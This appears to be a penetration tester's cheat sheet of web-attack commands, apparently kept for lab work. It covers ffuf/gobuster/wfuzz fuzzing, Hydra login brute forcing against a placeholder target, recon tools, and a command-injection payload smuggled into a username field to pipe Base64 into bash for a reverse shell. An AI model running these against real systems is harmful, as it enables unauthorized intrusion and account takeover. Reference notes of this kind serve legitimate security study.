##  Web Fuzzing Tools

### 🔹 FFUF — Fuzzing parameters, files, login forms, subdomains
```bash
ffuf -w wordlist.txt -u http://target.com/FUZZ
```
**Examples:**
- Fuzz POST param for command injection:
```bash
ffuf -w /usr/share/wordlists/SecLists/Fuzzing/command-injection-commix.txt \
  -u http://target.com/ -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=FUZZ" -fw 3
```
- Login form brute force:
```bash
ffuf -w usernames.txt:USERNAME -w passwords.txt:PASSWORD -X POST \
  -u http://target.com/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=USERNAME&password=PASSWORD" -fc 401
```
- Subdomain fuzzing:
```bash
ffuf -w subdomains.txt -u http://target.com/ -H "Host: FUZZ.target.com" -fs 0
```

```bash
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .php,.txt -mc 200,204,301,302,307,401,403 -t 50
```
### 🔹 Gobuster
```bash
gobuster dir -u http://target.com/ -w wordlist.txt -x php,html,txt -t 50 --exclude-length 53
```
- DNS mode:
```bash
gobuster dns -d target.com -w subdomains.txt -t 50
```

### 🔹 Dirsearch
```bash
dirsearch -u http://target.com/ -e php,html,txt -w wordlist.txt -t 40
```

### 🔹 Feroxbuster
```bash
feroxbuster -u http://target.com/ -w wordlist.txt -x php,html -t 50 -r
```

### 🔹 Wfuzz
```bash
wfuzz -w wordlist.txt -u http://target.com/FUZZ --hc 404
wfuzz -w wordlist.txt -u http://target.com/FUZZ.php --hc 404
```
- Fuzz headers:
```bash
wfuzz -w common.txt -u http://target.com/ -H "X-Forwarded-For: FUZZ" --hc 404
```

### 🔹Link to different [[Word List]] 
---

##  Fuzzing Parameters / Cookies / Headers

- Fuzz GET parameter values:
```bash
ffuf -u "http://target.com/page.php?param=FUZZ&static=value" -w wordlist.txt -mc all -fc 302 -H "Cookie: PHPSESSID=abcd"
```
- Fuzz cookies:
```bash
ffuf -w common.txt -u http://target.com/ -H "Cookie: FUZZ=1" -fs 0
```
- Fuzz headers:
```bash
wfuzz -w common.txt -u http://target.com/ -H "X-Header: FUZZ" --hc 404
```

---

##  Brute Force / Login Cracking

### 🔹 Hydra
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form \
"/login:username=^USER^&password=^PASS^:F=Login failed"
```

---

##  Recon Tools

### 🔹 WhatWeb
```bash
whatweb http://target.com
```
> Detects technologies used by a website

### 🔹 Sublist3r
```bash
sublist3r -d target.com -o subdomains.txt
```

### 🔹 SearchSploit
```bash
searchsploit keyword
```
> Searches for known exploits in Exploit-DB

---

##  API Interaction / Web Exploitation

### 🔹 Basic curl with JSON
```bash
curl -sX PUT http://target.com/api/endpoint \
  --cookie "PHPSESSID=sessionid" \
  -H "Content-Type: application/json" \
  -d '{"email": "user@htb.com", "is_admin": 1}' | jq
```

### 🔹 Reverse shell via curl + API
```bash
curl -sX POST http://target.com/api \
  --cookie "PHPSESSID=sessionid" \
  -H "Content-Type: application/json" \
  -d '{"username": "theo;echo <base64_payload> | base64 -d | bash;"}'
```
> Always encode payload in Base64 to avoid special char issues

---

##  SSRF Exploitation

### 🔹 SSRFmap
```bash
ssrfmap.py -r request.txt -p url -m portscan
```
> Exploits SSRF via given request, fuzzes the 'url' parameter, and runs internal port scanning

--- 
## Semgrep

